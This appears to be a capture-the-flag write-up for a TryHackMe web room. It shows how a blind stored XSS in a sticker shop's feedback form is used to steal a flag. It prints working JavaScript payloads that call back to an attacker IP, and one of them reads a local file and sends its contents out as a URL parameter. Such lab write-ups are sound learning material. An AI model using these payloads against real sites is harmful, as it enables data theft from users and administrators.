---
title: The Sticker Shop
date: 2024-12-15
categories: [TryHackMe, CTF]
tags: [tryhackme, ctf, xss, web]     # TAG names should always be lowercase
comments: false
image: /assets/img/tryhackme/ctf/stickershop/banner.png
---

>Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!
>
> Can you read the flag at http://TARGET-IP:8080/flag.txt?

## Reconnaissance

When we launch the machine and try to go to the `http://<TARGET-IP>:8080/flag.txt`, we get an **error 401** stating that we do not have the right permissions to access to this content.

When we head to the main page, we land on a website representing a Cat Sticker Shop that contains two tabs : *Home* tab and *Feedback* tab.

![home](/assets/img/tryhackme/ctf/stickershop/1.png)

The *Home* tab is just a simple tab with cat stickers.

![feedback](/assets/img/tryhackme/ctf/stickershop/2.png)

The *Feedback* tab allows us to send a feedback through a text input that we can submit.

Whenever we type a text and submit it, it displays a message thanking us from our feedback, but it does not display anything else (and this no matter what we send).

![feedback2](/assets/img/tryhackme/ctf/stickershop/3.png)

## Payload Injection

Thanks to [Swissky](https://github.com/swisskyrepo) and his [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-in-htmlapplications), we can try a few XSS injections, but since we know it does not display anything on the page, perhaps this target is vulnerable to some other triggers.

Indeed, when we try the following payload, we receive a request back to our listener :

```html
<script>fetch('http://<LOCAL-IP>:8080')</script>
```

![netcat](/assets/img/tryhackme/ctf/stickershop/4.png)

This proves that we could use this vulnerability to *force* the target machine to read the content of `http://<TARGET-IP>:8080/flag.txt` and to send it to us in a **parameter** inside of a **GET request**.

This is what we will try to do :

```html
<script>
fetch('http://127.0.0.1:8080/flag.txt')
  .then(res => res.text())
  .then(data => fetch('http://<LOCAL_IP>:8080?flag=' + encodeURIComponent(data)));
</script>
```

Here is how this payload works :

| **Code** | **Explanation** |
| ----------- | -------------- |
| `fetch('http://127.0.0.1:8080/flag.txt')` | The **fetch** command reaches to the local web server at the `/flag.txt` page with a request |
| `.then(res => res.text())` | The response to this request is converted to plain text |
| `.then(data => fetch('http://<LOCAL-IP>:8080?flag=' + encodeURIComponent(data)));` | The output (called *data*) is *encoded* (by `encodeURIComponent` to make sure that special characters are properly escaped<br> for inclusion in the URL) and appended to the URL requested by the fetch command as a **parameter** |

After submitting this payload in the *customer feedback* and waiting a few seconds, we receive the **GET request** from the target machine with the flag in the **parameter** :

![flag](/assets/img/tryhackme/ctf/stickershop/5.png)
